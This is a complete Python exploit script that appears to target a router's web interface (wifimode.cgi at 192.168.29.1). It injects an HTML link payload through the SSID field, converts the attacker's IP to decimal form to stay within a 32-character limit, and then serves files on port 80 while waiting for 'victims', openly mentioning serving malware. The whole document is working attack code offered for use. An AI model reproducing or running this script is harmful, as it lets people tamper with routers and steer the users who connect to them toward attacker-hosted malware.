import requests
import subprocess
import time

ascii_art= ''' ▄· ▄▌▪   ▐ ▄  ▄▄▄· • ▌ ▄ ·.  ▄▄▄· ▄ •▄  ▄▄▄· .▄▄ · ▪  
▐█▪██▌██ •█▌▐█▐█ ▀█ ·██ ▐███▪▐█ ▀█ █▌▄▌▪▐█ ▀█ ▐█ ▀. ██ 
▐█▌▐█▪▐█·▐█▐▐▌▄█▀▀█ ▐█ ▌▐▌▐█·▄█▀▀█ ▐▀▀▄·▄█▀▀█ ▄▀▀▀█▄▐█·
 ▐█▀·.▐█▌██▐█▌▐█▪ ▐▌██ ██▌▐█▌▐█▪ ▐▌▐█.█▌▐█▪ ▐▌▐█▄▪▐█▐█▌
  ▀ • ▀▀▀▀▀ █▪ ▀  ▀ ▀▀  █▪▀▀▀ ▀  ▀ ·▀  ▀ ▀  ▀  ▀▀▀▀ ▀▀▀'''
                
creator = "Created by h3iko (https://medium.com/@h3iko)"
twitter = "Twitter: @undefined_npc"

print(ascii_art)
print(creator)
print(twitter)

time.sleep(5)

lhost = input("LHOST : ")

print("[+] Converting IP")
ip_decimal = sum(int(octet) * 256**(3 - i) for i, octet in enumerate(lhost.split('.')))

print("[+] Checking connection...")
response_ping = subprocess.run(["ping", "-c", "1", lhost], capture_output=True)
if response_ping.returncode != 0:
    print("[-] IP is unavailable")
    exit()

print("[+] Creating payload")
payload = f'<a href=//{ip_decimal}/a.htm>!</a>'

if len(payload) > 32:
    print("[-] Payload characters limit is 32, aborting.")
    exit()

url = "http://192.168.29.1/wifimode.cgi"
headers = {
    "Host": "192.168.29.1",
    "User-Agent": "h4x0r",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "92",
    "Origin": "http://192.168.29.1",
    "DNT": "1",
    "Connection": "close",
    "Referer": "http://192.168.29.1/wireless_config.shtml",
    "Upgrade-Insecure-Requests": "1",
    "Sec-GPC": "1"
}

data = {
    "wifimode": "ap",
    "ssid": payload,
    "encrypt": "open",
    "channel": "9"
}

print("[+] Sending a POST request")
response = requests.post(url, headers=headers, data=data)

time.sleep(5)

print("[+] Please, disconnect and reconnect to the SSID", payload, "then press ENTER to continue")
input()

print("[+] Waiting for victims to connect to the malicious page, you should open up your ears in case you served malware")
subprocess.run(["python3", "-m", "http.server", "80"])
